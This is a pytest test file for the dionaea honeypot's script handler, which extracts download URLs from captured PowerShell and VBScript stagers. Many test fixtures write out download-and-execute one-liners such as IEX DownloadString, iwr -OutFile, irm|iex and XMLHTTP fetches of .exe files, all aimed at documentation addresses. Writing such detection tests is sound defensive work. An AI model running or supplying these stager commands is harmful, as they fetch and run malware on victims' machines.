# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""emu_scripts/handler.py gets the downloaded file as bytes (open(path, "rb")).

The module imports nothing of dionaea, so it is loaded from its file here.
"""

import importlib.util
import os
from pathlib import Path

import pytest


def _load():
    root = Path(os.environ["DIONAEA_PY_SRC"]) if os.environ.get("DIONAEA_PY_SRC") else (
        Path(__file__).resolve().parents[3] / "modules" / "python" / "dionaea")
    spec = importlib.util.spec_from_file_location("emu_scripts_handler", root / "emu_scripts" / "handler.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


handler = _load()

POWERSHELL = (
    b'$wc = New-Object System.Net.WebClient\r\n'
    b'$url = "http://203.0.113.5:8080/a/b.exe"\r\n'
    b'$wc.DownloadFile($url, "c:\\x.exe")\r\n'
)
VBSCRIPT = (
    b'Set http = CreateObject("Msxml2.XMLHTTP")\r\n'
    b'http.Open "GET", "http://example.org/x.bin", False\r\n'
)


def test_powershell_urls_of_bytes():
    urls = handler.PowerShell().run(POWERSHELL)
    assert urls == ["http://203.0.113.5:8080/a/b.exe"]
    assert all(type(url) is str for url in urls)


def test_vbscript_urls_of_bytes():
    assert handler.VBScript().run(VBSCRIPT) == ["http://example.org/x.bin"]


def test_raw_url_of_bytes():
    urls = handler.RawURL().run(b"junk ftp://198.51.100.7/f.sh and https://example.com/q?a=1 junk")
    assert urls == ["ftp://198.51.100.7/f.sh", "https://example.com/q?a=1"]


def test_str_input_still_works():
    assert handler.PowerShell().run(POWERSHELL.decode()) == ["http://203.0.113.5:8080/a/b.exe"]


@pytest.mark.parametrize("cls, data", [
    (handler.PowerShell, b"hello world http://example.org/x"),
    (handler.VBScript, b'"http://example.org/x"'),
])
def test_no_match_is_none(cls, data):
    assert cls().run(data) is None


def test_binary_data_does_not_raise():
    assert handler.PowerShell().run(bytes(range(256)) * 4) is None


# --- stagers: one script line per pattern ---------------------------------------------

POWERSHELL_STAGERS = [
    # Net.WebClient, wrapped in IEX / Invoke-Expression
    ("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')",
     "http://203.0.113.5/a.ps1"),
    ('iex(new-object net.webclient).downloadstring("http://203.0.113.5/b.ps1")',
     "http://203.0.113.5/b.ps1"),
    ("Invoke-Expression ((New-Object System.Net.WebClient).DownloadString( 'http://' + '203.0.113.5' + '/c.ps1' ))",
     "http://203.0.113.5/c.ps1"),
    ('(New-Object Net.WebClient).DownloadFile("http://203.0.113.5/d.exe", "$env:TEMP\\d.exe")',
     "http://203.0.113.5/d.exe"),
    ("$u='http://203.0.113.5/j.exe';(New-Object Net.WebClient).DownloadFile($u,'j.exe')",
     "http://203.0.113.5/j.exe"),
    ("[System.Net.WebClient]::new().DownloadData(\"https://example.com/q/data.bin\")",
     "https://example.com/q/data.bin"),
    # Invoke-WebRequest / iwr, Invoke-RestMethod / irm
    ("Invoke-WebRequest -Uri http://203.0.113.5/e.exe -OutFile C:\\e.exe", "http://203.0.113.5/e.exe"),
    ("iwr 'http://203.0.113.5/f.exe' -OutFile f.exe", "http://203.0.113.5/f.exe"),
    ("IWR -UseBasicParsing -Uri \"HTTP://203.0.113.5/k.exe\" -OutFile k.exe", "http://203.0.113.5/k.exe"),
    ('Invoke-RestMethod -Uri "http://203.0.113.5/g.ps1" | IEX', "http://203.0.113.5/g.ps1"),
    ("irm http://203.0.113.5/h.ps1|iex", "http://203.0.113.5/h.ps1"),
    # Start-BitsTransfer -Source
    ('Start-BitsTransfer -Source "http://203.0.113.5/i.exe" -Destination C:\\i.exe', "http://203.0.113.5/i.exe"),
    ("start-bitstransfer  -source  ftp://198.51.100.7/i2.exe  -destination i2.exe", "ftp://198.51.100.7/i2.exe"),
]

VBSCRIPT_STAGERS = [
    ('Set x = CreateObject("MSXML2.XMLHTTP") : x.Open "GET", "http://203.0.113.5/l.exe", False',
     "http://203.0.113.5/l.exe"),
    ('Set w = CreateObject("WinHttp.WinHttpRequest.5.1")\r\nw.Open "GET", "http://203.0.113.5/m.exe", False',
     "http://203.0.113.5/m.exe"),
    ('Set x = CreateObject("Microsoft.XMLHTTP")\r\nx.Open "GET", "http://203.0.113.5" & "/n.exe", False',
     "http://203.0.113.5/n.exe"),
    ('Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")\r\nu = "http://203.0.113.5/o.exe"\r\nx.Open "GET", u, False',
     "http://203.0.113.5/o.exe"),
    ('set x = createobject("msxml2.xmlhttp")\r\nx.open  "get" ,  "http://203.0.113.5/p.exe" , false',
     "http://203.0.113.5/p.exe"),
]


@pytest.mark.parametrize("line, url", POWERSHELL_STAGERS, ids=[u for _, u in POWERSHELL_STAGERS])
def test_powershell_stager_url(line, url):
    urls = handler.PowerShell().run(line.encode() + b"\r\n")
    assert urls == [url]


@pytest.mark.parametrize("line, url", VBSCRIPT_STAGERS, ids=[u for _, u in VBSCRIPT_STAGERS])
def test_vbscript_stager_url(line, url):
    urls = handler.VBScript().run(line.encode() + b"\r\n")
    assert urls == [url]


@pytest.mark.parametrize("line", [
    # no URL in the argument: nothing to offer, nothing of the script is taken as one
    "IEX (New-Object Net.WebClient).DownloadString($nowhere)",
    "iwr -Uri $x -OutFile y.exe",
    "Start-BitsTransfer -Source C:\\a.exe -Destination C:\\b.exe",
    # an URL without a host
    "iwr http:///nohost",
    # a word that only contains a cmdlet name
    "notiwr http://203.0.113.5/x.exe",
])
def test_powershell_stager_without_url(line):
    assert handler.PowerShell().run(line.encode()) is None


@pytest.mark.parametrize("cmdlet", ["swr", "srm", "itart-BitsTransfer", "snvoke-WebRequest", "snvoke-RestMethod",
                                    "Swr", "iTART-BitsTransfer"])
def test_a_misspelled_cmdlet_is_no_stager(cmdlet):
    # the first letter belongs to its cmdlet: s only for Start-BitsTransfer, i for the others
    assert handler.PowerShell().run(("%s http://203.0.113.5/x.exe -OutFile x.exe" % cmdlet).encode()) is None


@pytest.mark.parametrize("cmdlet", ["iwr", "IRM", "Invoke-WebRequest", "invoke-restmethod", "Start-BitsTransfer",
                                    "START-BITSTRANSFER"])
def test_each_cmdlet_in_any_case_is_a_stager(cmdlet):
    assert handler.PowerShell().run(("%s http://203.0.113.5/x.exe" % cmdlet).encode()) == ["http://203.0.113.5/x.exe"]


def test_vbscript_open_without_an_http_object_is_not_taken():
    assert handler.VBScript().run(b'x.Open "GET", "http://203.0.113.5/l.exe", False') is None


def test_a_concatenation_with_code_is_not_taken():
    # a concatenation with a variable is no simple one: its literal start is not the URL
    line = b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/' + $env:COMPUTERNAME)"
    assert handler.PowerShell().run(line) is None


def test_several_stagers_give_each_url_once():
    script = (b"iwr http://203.0.113.5/1.exe -OutFile 1.exe\r\n"
              b"iwr http://203.0.113.5/2.exe -OutFile 2.exe\r\n"
              b"iwr http://203.0.113.5/1.exe -OutFile 1.exe\r\n")
    assert handler.PowerShell().run(script) == ["http://203.0.113.5/1.exe", "http://203.0.113.5/2.exe"]


# --- bounded: linear time on large input ----------------------------------------------

MIB = 1024 * 1024


def _assignments(line, calls, head=b""):
    """head, then line repeated up to 1 MiB, then calls."""
    count = (MIB - len(head) - len(calls)) // len(line) + 1
    return head + line * count + calls


DETECTED = b"New-Object System.Net.WebClient\r\n$wc.DownloadFile($u, 'x')\r\n"


def _large_input():
    def fill(unit):
        return (unit * (MIB // len(unit) + 1))[:MIB]
    return {
        "word": fill(b"a"),
        "dots": b"http://" + fill(b"a."),
        "assign": fill(b"a="),
        "url-assign-unclosed": b'$u = "http://' + fill(b"a.a"),
        "quote": fill(b"'"),
        "dquote": fill(b'"'),
        "concat": fill(b"'a'+"),
        "vb-concat": fill(b'"a"&'),
        "cmdlet": fill(b"iwr "),
        "cmdlet-param": b"iwr " + fill(b"-a "),
        "webclient": fill(b".DownloadString("),
        "webclient-var": fill(b".DownloadString($a"),
        "createobject": fill(b"Set a = CreateObject("),
        "open": b'Set x = CreateObject("MSXML2.XMLHTTP")' + fill(b'.Open "GET", '),
        "open-var": b'Set x = CreateObject("MSXML2.XMLHTTP")' + fill(b'.Open "GET", a'),
        "downloadfile": fill(b"DownloadFile(a"),
        "invoke-expression": fill(b"Invoke-Expression(a"),
        "binary": bytes(range(256)) * (MIB // 256),
        "webclient-vars": fill(b"".join(b".DownloadString($v%d) $v%d = 'x' " % (i, i) for i in range(4096))),
        "cmdlet-unclosed": fill(b"iwr '"),
        "cmdlet-concat": b"iwr " + fill(b"'a' + "),
        "open-unclosed": b'Set x = CreateObject("MSXML2.XMLHTTP")' + fill(b'.Open "GET", "'),
        # one variable assigned again and again (long literals, long concatenations), then
        # 256 calls that read it: the lookup of the assignment must not walk them all per call
        "ps-assign-same-var": _assignments(b"$a='" + b"x" * 200 + b"'\n",
                                           b".DownloadString($a)\n" * 256 + b"iwr $a\n" * 256),
        "ps-assign-concat": _assignments(b"$a=" + b"'xxxxxxxxxx'+" * 15 + b"'x'\n",
                                         b".DownloadString($a)\n" * 256 + b"iwr $a\n" * 256),
        "vb-assign-same-var": _assignments(b'a="' + b"x" * 200 + b'"\n', b'.Open "GET", a\n' * 256,
                                           b'Set x = CreateObject("MSXML2.XMLHTTP")\n'),
        "vb-assign-concat": _assignments(b"a=" + b'"xxxxxxxxxx" & ' * 15 + b'"x"\n', b'.Open "GET", a\n' * 256,
                                         b'Set x = CreateObject("MSXML2.XMLHTTP")\n'),
        # comments and strings everywhere: the comment spans are found in one pass
        "ps-comments": fill(b"# c\n<# b #>'s'\"d\"") + b"\niwr http://203.0.113.5/x\n",
        "ps-unclosed-blocks": fill(b"<#") + b"\n",
        "vb-comments": b'Set x = CreateObject("MSXML2.XMLHTTP")\n' + fill(b"' c\nRem r\n\"s\"") + b"\n",
        # behind what the older detection of PowerShell wants to see
        "detected-word": DETECTED + fill(b"a"),
        "detected-url-unclosed": DETECTED + b'$u = "http://' + fill(b"a.a"),
    }


@pytest.mark.parametrize("cls", [handler.PowerShell, handler.VBScript, handler.RawURL])
@pytest.mark.parametrize("name", sorted(_large_input()))
def test_one_mib_runs_fast(cls, name):
    import time
    data = _large_input()[name]
    assert len(data) >= MIB
    instance = cls()
    best = None
    for _ in range(3):
        start = time.perf_counter()
        instance.run(data)
        took = time.perf_counter() - start
        best = took if best is None else min(best, took)
    assert best < 0.1, "%s: %.3f s" % (name, best)


# --- comments ------------------------------------------------------------------------


@pytest.mark.parametrize("script", [
    b"# iwr http://203.0.113.5/a.exe\n",
    b"  # (New-Object Net.WebClient).DownloadString('http://203.0.113.5/b.ps1')\n",
    b"<# (New-Object Net.WebClient).DownloadString('http://203.0.113.5/c.ps1') #>\n",
    b"<#\nblock\niwr http://203.0.113.5/d.exe\n#>\n",
    b"<# never closed\niwr http://203.0.113.5/e.exe\n",
    b"$x = 1 # iwr http://203.0.113.5/f.exe\n",
])
def test_a_powershell_comment_is_no_stager(script):
    assert handler.PowerShell().run(script) is None


@pytest.mark.parametrize("script, url", [
    (b"<# note #> iwr http://203.0.113.5/g.exe\n", "http://203.0.113.5/g.exe"),
    (b"iwr 'http://203.0.113.5/h.exe#frag' # a comment\n", "http://203.0.113.5/h.exe#frag"),
    (b"$s = '# no comment'; iwr http://203.0.113.5/i.exe\n", "http://203.0.113.5/i.exe"),
    (b"<#\nblock\n#>\niwr http://203.0.113.5/j.exe\n", "http://203.0.113.5/j.exe"),
])
def test_powershell_code_beside_comments_is_read(script, url):
    assert handler.PowerShell().run(script) == [url]


def test_a_commented_assignment_is_not_the_value():
    script = b"$u = 'http://203.0.113.5/real.exe'\n# $u = 'http://203.0.113.5/old.exe'\niwr $u\n"
    assert handler.PowerShell().run(script) == ["http://203.0.113.5/real.exe"]


VB_HEAD = b'Set x = CreateObject("MSXML2.XMLHTTP")\n'


@pytest.mark.parametrize("line", [
    b"' x.Open \"GET\", \"http://203.0.113.5/k.exe\", False",
    b"Rem x.Open \"GET\", \"http://203.0.113.5/l.exe\", False",
    b"  rem x.Open \"GET\", \"http://203.0.113.5/l2.exe\", False",
    b"y = 1 : Rem x.Open \"GET\", \"http://203.0.113.5/m.exe\", False",
    b"y = 1 ' x.Open \"GET\", \"http://203.0.113.5/n.exe\", False",
])
def test_a_vbscript_comment_is_no_stager(line):
    assert handler.VBScript().run(VB_HEAD + line + b"\n") == []


@pytest.mark.parametrize("line, url", [
    (b"x.Open \"GET\", \"http://203.0.113.5/o.exe\", False ' a comment", "http://203.0.113.5/o.exe"),
    (b"s = \"it's\" : x.Open \"GET\", \"http://203.0.113.5/p.exe\", False", "http://203.0.113.5/p.exe"),
    (b"Remark = 1 : x.Open \"GET\", \"http://203.0.113.5/q.exe\", False", "http://203.0.113.5/q.exe"),
])
def test_vbscript_code_beside_comments_is_read(line, url):
    assert handler.VBScript().run(VB_HEAD + line + b"\n") == [url]
